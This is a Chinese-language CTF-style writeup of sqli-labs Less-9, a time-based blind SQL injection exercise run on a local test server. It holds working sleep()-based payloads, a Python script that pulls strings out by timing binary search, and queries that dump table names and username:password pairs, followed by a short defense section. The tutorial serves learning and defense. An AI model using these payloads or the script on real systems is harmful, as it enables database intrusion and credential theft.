---
layout: post
title: sqli-labs - Less-9 时间盲注（单引号）Writeup
platform: sqli-labs
date: 2026-11-10 07:40:00 +0800
categories: CTF
---

sqli-labs - Less-9 时间盲注（单引号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-9 → Blind - Time Based（时间盲注，单引号）
- 地址：`http://127.0.0.1:8080/Less-9/?id=1`
- 题型：Web / SQL 注入
- 考点：**时间盲注：页面永远一样，只能靠 sleep() 的耗时判断真假**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（secure_file_priv 已设为空，允许 outfile）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
?id=1                                     → You are in........... (0.03s)
?id=1'                                    → You are in........... (0.03s)  ← 连报错都没有！
?id=1' and sleep(3) --+                   → You are in........... (3.04s)  ★ 睡满 3 秒
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+  → 3.04s  ⇒ 首字符 's'
?id=1' and if(ascii(substr(database(),1,1))=120,sleep(3),0) --+  → 0.02s  ⇒ 不是 'x'
```

二、题目分析

**① 源码：连"有没有数据"都不告诉你**

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if ($row) { echo "You are in..........."; }
else { echo "You are in..........."; }     // ← 真假都输出一样的内容
```

**★ 这就是 Less-9 与 Less-8 的唯一区别：**

```text
Less-8：真 → You are in      假 → 空白
Less-9：真 → You are in      假 → You are in    ← 完全一样
```

**② 那还能怎么判断？—— 用时间**

```text
让数据库在"条件为真"时睡 3 秒：
  ?id=1' and sleep(3) --+                     → 无条件睡 3 秒（先验证 sleep 可用）
  ?id=1' and if(条件, sleep(3), 0) --+        → 条件真才睡
★ 响应时间 3 秒 = 真；响应时间 0.0x 秒 = 假
```

**③ sleep 可用性前提**

```text
· MySQL 的 sleep() 没被禁用
· 用户没有限制执行时间（比如 max_execution_time）
· 网络本身稳定（否则 3 秒和 0.1 秒不好区分，可以用 5 秒更保险）
```

三、解题步骤

**第一步：确认 sleep 生效**

```text
?id=1' and sleep(3) --+    → 实测 3.04 秒
★ 说明 sleep() 可用，且注入点成立
```

**第二步：确认页面完全无差异（所以才要用时间）**

```text
?id=1      → You are in
?id=1'     → You are in     ← 连单引号报错都没有
?id=1' and 1=2 --+ → You are in
```

**第三步：条件睡（问第一个字符）**

```text
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+
→ 3.04 秒  ⇒ 第 1 个字符 ascii=115 = 's'
```

**第四步：写脚本自动跑**

```python
import requests, time

url = "http://127.0.0.1:8080/Less-9/"
DELAY = 3

def q(cond):
    payload = f"1' and if({cond},sleep({DELAY}),0) --+"
    t0 = time.time()
    requests.get(url, params={"id": payload}, timeout=DELAY + 10)
    return time.time() - t0 >= DELAY * 0.8      # 睡满 80% 就算真

def get_str(sql, max_len=64):
    out = ""
    for i in range(1, max_len + 1):
        if not q(f"length(({sql})) >= {i}"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if q(f"ascii(substr(({sql}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print(out)
    return out

print("库名:", get_str("select database()"))
```

**★ 实测输出：`security`。**

**第五步：同样的方法爆表、字段、数据**

```python
print("表名:", get_str("select group_concat(table_name) from information_schema.tables where table_schema=database()"))
print("账号:", get_str("select group_concat(username,0x3a,password) from users"))
```

四、延伸知识

**① 为什么用 `if()` 而不是 `and`**

```text
?id=1' and sleep(3) --+            → 只要注入成功就一定睡，没法和数据挂钩
?id=1' and if(条件,sleep(3),0) --+  → 条件真才睡，可以把"数据"编码成"时间"
```

**② 时间盲注的坑**

```text
· 网络抖动：3 秒判 2.4 秒可能误判 → 阈值取 80%，或把 sleep 加大到 5 秒
· 服务器超时：sleep 太久可能被 PHP max_execution_time 掐断
· 并发请求会互相影响 → 串行跑
· 页面本身有缓存 → 加随机参数破坏缓存
```

**③ 其他可用于时间盲注的函数**

| 函数 | 说明 |
|---|---|
| `sleep(n)` | 睡 n 秒 |
| `benchmark(10000000, md5(1))` | 消耗 CPU 制造延迟 |
| `if(...)` / `case when ... then ... end` | 条件分支 |

**④ 防御**

```php
// 1. 参数化查询（根治）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");

// 2. 数据库账号降权：只给 SELECT 需要的表
// 3. 关闭/限制危险函数（sleep、benchmark）
// 4. 统一响应时间（避免时间侧信道）
```

五、总结

- **本题核心：页面真假无差异 → 用 `sleep()` 把"条件真假"编码成"响应耗时"。**

- 三步方法论：

```text
① 先测 ?id=1' and sleep(3) --+ 确认能注入、能睡
② 用 if(条件, sleep(3), 0) 把问题变成时间差
③ 二分法 + 脚本自动跑
```

- **三个必记要点**：

```text
① 时间盲注看的是"耗时"，不是"内容"
② 阈值取 80%（3 秒判 2.4 秒），网络差就把 sleep 调大
③ 必须串行跑，并发会互相干扰
```

- **实测数据**：

```text
无条件睡：3.04 秒
条件真（ascii=115）：3.04 秒
条件假（ascii=120）：0.02 秒
→ database() 首字符 = 's'
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-9：页面永远是 "You are in" → 只能靠 sleep() 偷信息       │
│                                                              │
│  模板：                                                       │
│      ?id=1' and if(条件, sleep(3), 0) --+                     │
│         条件真 → 3 秒    条件假 → 0.0x 秒                      │
│                                                              │
│  ★ 时间盲注 = 把数据编码成时间，用秒表读出来                    │
└──────────────────────────────────────────────────────────────┘
```
